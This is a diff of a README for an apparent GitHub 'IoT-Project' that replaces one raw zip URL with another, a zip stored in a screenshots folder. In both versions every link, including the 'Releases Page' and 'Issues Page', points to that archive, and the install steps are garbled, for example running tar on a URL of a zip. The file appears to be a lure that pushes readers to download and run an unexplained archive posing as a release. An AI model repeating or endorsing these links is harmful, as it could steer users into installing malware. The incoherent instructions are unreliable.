@@ -1,7 +1,7 @@
 # 🎉 IoT-Project - Your Gateway to Smart Solutions
 
 ## 🔗 Download Now
-[![Download IoT-Project](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip%https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip)](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip)
+[![Download IoT-Project](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip%https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip)](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip)
 
 ## 📖 Description
 Welcome to the IoT-Project! This application offers a user-friendly way to explore Internet of Things (IoT) solutions. It is designed for both web and desktop interfaces. The project uses Python for backend operations and ReactJS for the frontend, ensuring a smooth user experience. You can use it without any programming knowledge.
@@ -17,16 +17,16 @@ Before downloading, make sure your system meets the following requirements:
 - **Internet Connection:** Required for initial setup and updates
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip).
 2. **Choose Your Version:** Look for the latest version at the top of the page. 
 3. **Download the File:** Click on the appropriate file for your operating system. 
    - For Windows users, download the `.exe` file.
    - For macOS, choose the `.dmg` file.
-   - For Linux, pick the `https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip` file.
+   - For Linux, pick the `https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip` file.
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Open a terminal, navigate to the folder where the downloaded file is, and run `tar -xvzf https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip` to extract and then launch.
+   - **Linux:** Open a terminal, navigate to the folder where the downloaded file is, and run `tar -xvzf https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip` to extract and then launch.
 
 ### 🔧 Configuration
 After installing, you may want to configure the application to better suit your needs. Here’s how:
@@ -53,7 +53,7 @@ If you encounter any issues during installation or use, consider the following t
 - **Consult the FAQ:** Look for answers in the Frequently Asked Questions section on our GitHub page.
 
 ## 📝 Feedback & Support
-We'd love to hear your thoughts. If you have questions or suggestions, please visit the [Issues Page](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip) to report them or ask for help. 
+We'd love to hear your thoughts. If you have questions or suggestions, please visit the [Issues Page](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip) to report them or ask for help. 
 
 ## 🌍 Join the Community
 Become part of our growing community. Participate in discussions, share your experiences, and learn with others. Check out our community forum linked on the GitHub page.
@@ -61,4 +61,4 @@ Become part of our growing community. Participate in discussions, share your exp
 We hope you enjoy using IoT-Project and find it helpful in your IoT journey. Happy exploring!
 
 ## 🔗 Download Now Again
-[![Download IoT-Project](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip%https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip)](https://raw.githubusercontent.com/Wdalzalath/IoT-Project/main/Raspberrypi/IoT-Project_1.7.zip)
+[![Download IoT-Project](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip%https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip)](https://github.com/Wdalzalath/IoT-Project/raw/refs/heads/main/Desktop Base/Tkinter/screenshots/Io_Project_1.2.zip)
